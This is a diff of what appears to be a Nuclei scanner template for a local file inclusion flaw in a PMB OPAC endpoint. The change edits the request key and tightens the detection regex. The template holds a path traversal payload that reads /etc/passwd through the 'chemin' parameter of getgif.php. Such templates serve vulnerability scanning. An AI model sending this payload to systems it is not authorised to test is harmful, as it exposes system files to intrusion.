@@ -9,7 +9,7 @@ info:
   tags: lfi
 
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik"
@@ -20,7 +20,7 @@ http:
     matchers:
       - type: regex
         regex:
-          - "root:.*:0:0"
+          - "root:.*:0:0:"
 
       - type: status
         status:
